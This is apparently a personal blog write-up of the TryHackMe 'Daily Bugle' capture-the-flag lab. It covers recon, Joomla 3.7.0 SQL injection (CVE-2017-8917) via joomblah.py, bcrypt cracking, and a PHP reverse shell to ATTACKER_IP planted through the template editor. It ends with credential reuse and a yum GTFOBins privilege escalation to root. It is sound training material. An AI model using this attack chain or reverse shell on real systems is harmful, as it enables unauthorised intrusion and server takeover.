@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Daily Bugle | Jenn Shagrin</title>
+<meta name="description" content="TryHackMe CTF — Joomla 3.7.0 SQLi via CVE-2017-8917, joomblah.py credential dump, bcrypt hash cracking, PHP reverse shell via template editor, DB credential reuse, yum GTFOBins privesc to root.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/daily-bugle.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<meta property="og:url" content="https://jennshaggy.github.io/daily-bugle.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Daily Bugle">
+<meta property="og:description" content="TryHackMe CTF — Joomla 3.7.0 SQLi via CVE-2017-8917, joomblah.py credential dump, bcrypt hash cracking, PHP reverse shell via template editor, yum GTFOBins privesc to root.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Daily Bugle">
+<meta name="twitter:description" content="TryHackMe CTF — Joomla 3.7.0 SQLi via CVE-2017-8917, joomblah.py credential dump, bcrypt hash cracking, PHP reverse shell via template editor, yum GTFOBins privesc to root.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://iad.portfolio.instructure.com/shared/4c4c330d1376bf479a9cbb73190bad1a110fb33cf436c283" title="CIAT Portfolio" target="_blank" rel="noopener noreferrer">
+                    <span>CIAT Portfolio</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Daily Bugle</h1>
+    <div class="post-description">TryHackMe CTF &mdash; Compromise a Joomla CMS account via SQLi, crack hashes, and escalate privileges by taking advantage of yum. Also: Spiderman robbed the bank.</div>
+  </header>
+
+  <div class="post-content">
+
+<hr>
+
+<h2>Port Enumeration</h2>
+
+<p>A few different Nmap scans for tactical-approach recon. Starting with service and script enumeration:</p>
+
+<pre><code>nmap -sC -sV -Pn --script=http-enum 10.144.132.32</code></pre>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 7.43.53 AM.png" alt="nmap scan with http-enum showing open ports and services" style="max-width:100%;margin:2rem 0;">
+
+<p>MariaDB version flagged early &mdash; DB language and version matter. Initial inventory:</p>
+
+<ul>
+<li>Port 22 &mdash; SSH + OpenSSH 7.4</li>
+<li>Port 80 &mdash; HTTP</li>
+<li>Port 3306 &mdash; MySQL + MariaDB 10.3.23 or earlier</li>
+</ul>
+
+<p>The more detailed vuln/CVE-focused scan surfaced something intriguing, especially given that Spiderman imagery (Sony Pictures) scattered across the target site:</p>
+
+<pre><code>nmap -sS -Pn -sC -sV --script=vuln -T4 -A 10.145.146.247 -oN daily_bugle_nmap_result.txt</code></pre>
+
+<p>The output is large. Here&rsquo;s what caught my eye and inadvertently handed over the first flag:</p>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 7.28.56 AM.png" alt="nmap vuln scan output highlighting Joomla vulnerability and spider-man URL path" style="max-width:100%;margin:2rem 0;">
+
+<p>Vulnerability is clear. And at both the top and bottom of this output, I have vested interests.</p>
+
+<p>The <code>http-csrf</code> findings also mapped out quite a few subdomains waiting to be crossed, sited, requested, and forged:</p>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 7.30.51 AM.png" alt="http-csrf subdomain list from nmap output" style="max-width:100%;margin:2rem 0;">
+
+<p>The bank robber is Spiderman. <code>/index.php/2-uncategorised/1-spider-man-robs</code> leaked directly in the first Nmap output.</p>
+
+<hr>
+
+<h2>Identifying the Joomla Version</h2>
+
+<p>Armed with initial recon, digging deeper with a targeted scan on the known open ports:</p>
+
+<pre><code>nmap -sCV -p22,80,3306 -T4 10.144.132.32</code></pre>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 7.52.44 AM.png" alt="nmap -sCV targeted scan on ports 22, 80, 3306" style="max-width:100%;margin:2rem 0;">
+
+<p>Nmap kept pushing back, so a different angle:</p>
+
+<pre><code>whatweb http://10.146.132.82</code></pre>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 8.22.57 AM.png" alt="whatweb confirming Joomla, Apache, PHP version, and JQuery" style="max-width:100%;margin:2rem 0;">
+
+<p>Beautiful. Updated picture:</p>
+
+<ul>
+<li>Port 22: SSH + OpenSSH 7.4 (protocol 2.0)</li>
+<li>Port 80: HTTP + Apache/2.4.6 (CentOS) PHP/5.6.40</li>
+<li>Port 3306: MySQL + MariaDB 10.3.23 or earlier (flagged &ldquo;unauthorized&rdquo; &mdash; we&rsquo;ll see about that)</li>
+<li>JQuery + Joomla</li>
+</ul>
+
+<p>What we already know about attack vectors and directory structure:</p>
+
+<ul>
+<li><code>/index.php/2-uncategorised/1-spider-man-robs</code> leaked in first Nmap scan</li>
+<li>CSRF exists on <code>/index.php</code></li>
+<li>Possible credential-stuffing opportunity via MariaDB</li>
+<li>PHP 5.6.40 is a vulnerability goldmine</li>
+<li>Joomla CMS is ready for action</li>
+</ul>
+
+<pre><code>joomscan -u http://10.146.132.82</code></pre>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 9.15.39 AM.png" alt="joomscan output part 1 showing directory structure and config" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 9.20.41 AM.png" alt="joomscan output part 2 confirming Joomla 3.7.0 and /administrator/ path" style="max-width:100%;margin:2rem 0;">
+
+<p>Attack path final form achieved:</p>
+
+<ul>
+<li>Joomla 3.7.0 &mdash; exploitable via SQLi CVE-2017-8917</li>
+<li>Admin panel lives at <code>/administrator/</code></li>
+</ul>
+
+<hr>
+
+<h2>Exploit Research</h2>
+
+<pre><code>searchsploit joomla 3.7.0</code></pre>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 9.41.39 AM.png" alt="searchsploit results for joomla 3.7.0 showing CVE-2017-8917 SQLi exploit" style="max-width:100%;margin:2rem 0;">
+
+<p>A hit. Sometimes less is more.</p>
+
+<pre><code>searchsploit -x php/webapps/42033.txt</code></pre>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 9.45.05 AM.png" alt="searchsploit -x showing exploit details for 42033.txt" style="max-width:100%;margin:2rem 0;">
+
+<p>The exploit details a <code>sqlmap</code>-based attack; the lab points toward Python. The dude abides.</p>
+
+<pre><code>searchsploit -m php/webapps/42033.txt</code></pre>
+
+<p>Looking for a Python version:</p>
+
+<pre><code>searchsploit joomla 3.7 | grep -i py</code></pre>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 9.50.18 AM.png" alt="searchsploit joomla 3.7 grep for python returning no results" style="max-width:100%;margin:2rem 0;">
+
+<p>Nothing local. Research turns up a known community script:</p>
+
+<pre><code>curl -s https://raw.githubusercontent.com/XiphosResearch/exploits/master/Joomblah/joomblah.py -o joomblah.py</code></pre>
+
+<hr>
+
+<h2>SQLi Credential Dump via joomblah.py</h2>
+
+<pre><code>python3 joomblah.py http://10.146.132.82</code></pre>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 9.53.31 AM.png" alt="joomblah.py first run with Python2/Python3 compatibility error" style="max-width:100%;margin:2rem 0;">
+
+<p>Results incoming, but a Python 2 vs. Python 3 compatibility bug gets in the way:</p>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 9.55.15 AM.png" alt="joomblah.py Python compatibility error detail" style="max-width:100%;margin:2rem 0;">
+
+<p>Fix and rerun:</p>
+
+<pre><code>sed -i 's/result += value/result += value.decode("utf-8")/' joomblah.py
+python3 joomblah.py http://10.146.132.82</code></pre>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 9.57.23 AM.png" alt="joomblah.py fixed output with Jonah's bcrypt hash extracted" style="max-width:100%;margin:2rem 0;">
+
+<p>From now until <code>root</code>, call me Jonah. Sorry, Jonah. You just got pwned.</p>
+
+<ul>
+<li>Jonah&rsquo;s hash: <code>$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm</code></li>
+<li>Hash type: <code>bcrypt</code> &mdash; identifiable by the <code>$2y$</code> prefix</li>
+</ul>
+
+<hr>
+
+<h2>Hash Cracking</h2>
+
+<pre><code>echo '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' > jonah.hash
+john jonah.hash --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 10.06.16 AM.png" alt="john cracking bcrypt hash to spiderman123" style="max-width:100%;margin:2rem 0;">
+
+<p>John delivers the credentials needed to access <code>/administrator/</code>:</p>
+
+<ul>
+<li>Username: <code>jonah</code></li>
+<li>Password: <code>spiderman123</code></li>
+</ul>
+
+<hr>
+
+<h2>Admin Panel Access</h2>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 10.12.28 AM.png" alt="Joomla /administrator/ login page" style="max-width:100%;margin:2rem 0;">
+
+<p>Hello, Joomla login page. Don&rsquo;t mind me. I&rsquo;m only here for a moment, then I&rsquo;ll be out of your hair.</p>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 10.15.21 AM.png" alt="Joomla admin dashboard after successful login as jonah" style="max-width:100%;margin:2rem 0;">
+
+<p>We are in. Thanks, Jonah and John.</p>
+
+<p>What we&rsquo;re about to exploit is not exactly a vulnerability, but abuse of an intended Joomla admin feature: the template editor. It lets administrators edit raw PHP files that are then executed by the web server. I think you can see where that&rsquo;s headed.</p>
+
+<p>Head to Templates in the left panel of the dashboard:</p>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 10.18.29 AM.png" alt="Joomla admin dashboard with Templates circled in the left panel" style="max-width:100%;margin:2rem 0;">
+
+<p>Direct URL: <code>http://TARGET_IP/administrator/index.php?option=com_templates</code></p>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 10.24.31 AM.png" alt="Joomla Templates: Styles page showing Prostar as active default template" style="max-width:100%;margin:2rem 0;">
+
+<p>Click Templates again in the left panel, then click into <code>Prostar</code> &mdash; the active default for all pages:</p>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 10.29.43 AM.png" alt="Joomla Templates: Templates page with Prostar listed" style="max-width:100%;margin:2rem 0;">
+
+<p>Direct URL: <code>http://TARGET_IP/administrator/index.php?option=com_templates&amp;view=template&amp;id=506&amp;file=aG9tZQ==</code></p>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 10.34.37 AM.png" alt="Prostar template editor with file list visible" style="max-width:100%;margin:2rem 0;">
+
+<p>Inside Prostar, a file list with a sickly Victorian <code>index.php</code> just begging for a reverse shell to make life whole again:</p>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 10.35.03 AM.png" alt="index.php circled in Prostar template file list" style="max-width:100%;margin:2rem 0;">
+
+<hr>
+
+<h2>Reverse Shell via Template Editor</h2>
+
+<p>First, set up a netcat listener in a new terminal:</p>
+
+<pre><code>nc -lvnp 4444</code></pre>
+
+<p>Open <code>index.php</code> in the Joomla template editor and place this code above everything else (with your attacker IP swapped in):</p>
+
+<pre><code>&lt;?php exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1'"); ?&gt;</code></pre>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 10.42.10 AM.png" alt="PHP reverse shell injected at top of index.php in Joomla template editor" style="max-width:100%;margin:2rem 0;">
+
+<p>This feels oddly reminiscent of editing MySpace source code. But I digress.</p>
+
+<p>Click &ldquo;Save&rdquo; (green button, upper left). Then trigger the shell by visiting <code>TARGET_IP</code> directly in-browser.</p>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 10.57.22 AM.png" alt="netcat listener catching the reverse shell connection" style="max-width:100%;margin:2rem 0;">
+
+<p>Shell caught.</p>
+
+<pre><code>whoami
+pwd</code></pre>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 1.13.57 PM.png" alt="whoami and pwd confirming shell as apache user" style="max-width:100%;margin:2rem 0;">
+
+<p>We are Apache. Later days, Jonah.</p>
+
+<hr>
+
+<h2>Database Credentials from Configuration File</h2>
+
+<p>Search Joomla&rsquo;s config file &mdash; a treasure trove of end-user vulnerabilities:</p>
+
+<pre><code>cat /var/www/html/configuration.php</code></pre>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 1.16.53 PM.png" alt="configuration.php showing plaintext DB credentials: root / nv5uz9r3ZEDzVjNu" style="max-width:100%;margin:2rem 0;">
+
+<p>Big shout-out to Joomla for keeping it easy and breezy:</p>
+
+<ul>
+<li>DB user: <code>root</code></li>
+<li>DB password: <code>nv5uz9r3ZEDzVjNu</code></li>
+<li>DB name: <code>joomla</code></li>
+</ul>
+
+<hr>
+
+<h2>Lateral Movement: su jjameson</h2>
+
+<p>Still in the shell:</p>
+
+<pre><code>su jjameson</code></pre>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 1.23.00 PM.png" alt="su jjameson failing in non-interactive shell with must be run from terminal error" style="max-width:100%;margin:2rem 0;">
+
+<p>Non-interactive shell throwing a tantrum over handling <code>su</code>. Upgrade it first:</p>
+
+<pre><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 1.25.31 PM.png" alt="pty.spawn shell upgrade then su jjameson succeeding with DB password" style="max-width:100%;margin:2rem 0;">
+
+<p>Password reuse confirmed: <code>nv5uz9r3ZEDzVjNu</code> works for <code>jjameson</code> as well. I am not the mid-level almighty jameson!</p>
+
+<pre><code>cat ~/user.txt</code></pre>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 1.26.58 PM.png" alt="user flag retrieved as jjameson" style="max-width:100%;margin:2rem 0;">
+
+<p>User flag: <code>27a260fe3cba712cfdedb1c86d80442e</code></p>
+
+<hr>
+
+<h2>Privilege Escalation via yum</h2>
+
+<pre><code>sudo -l</code></pre>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 1.29.24 PM.png" alt="sudo -l showing jjameson can run /usr/bin/yum as root with no password" style="max-width:100%;margin:2rem 0;">
+
+<p><code>yum</code> with no password. Delicious. Thanks to GTFOBins, with some <code>echo</code> modifications for this non-interactive shell:</p>
+
+<pre><code>TF=$(mktemp -d)
+echo -e "[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF" > $TF/x
+echo -e "[main]\nenabled=1" > $TF/y.conf
+echo -e "import os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  os.execl('/bin/sh','/bin/sh')" > $TF/y.py
+sudo yum -c $TF/x --enableplugin=y</code></pre>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 2.11.39 PM.png" alt="yum GTFOBins privesc commands executing" style="max-width:100%;margin:2rem 0;">
+
+<p>WOOOO!</p>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 2.11.56 PM.png" alt="root shell confirmed via yum plugin exploit" style="max-width:100%;margin:2rem 0;">
+
+<p>Confirmed WOOOO!!!</p>
+
+<pre><code>cat /root/root.txt</code></pre>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 2.12.58 PM.png" alt="root flag retrieved" style="max-width:100%;margin:2rem 0;">
+
+<p>Root flag: <code>eec3d53292b1821868266858d7fa6f79</code></p>
+
+<img src="/images/daily-bugle/Screenshot 2026-05-05 at 2.14.58 PM.png" alt="final confirmation of rooted Daily Bugle machine" style="max-width:100%;margin:2rem 0;">
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<pre><code>Nmap + WhatWeb &rarr; Joomla 3.7.0 identified, spider-man URL path (bank robber = Spiderman)
+&rarr; JoomScan &rarr; admin panel at /administrator/, confirmed Joomla 3.7.0
+&rarr; CVE-2017-8917 &rarr; joomblah.py (Python3 fix applied) &rarr; Jonah&rsquo;s bcrypt hash
+&rarr; John the Ripper &rarr; spiderman123
+&rarr; Admin panel login &rarr; template editor &rarr; PHP reverse shell in index.php
+&rarr; Shell as apache &rarr; configuration.php &rarr; DB credentials (root / nv5uz9r3ZEDzVjNu)
+&rarr; Password reuse &rarr; su jjameson
+&rarr; sudo -l &rarr; yum NOPASSWD &rarr; GTFOBins yum plugin exploit &rarr; root</code></pre>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> ·
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
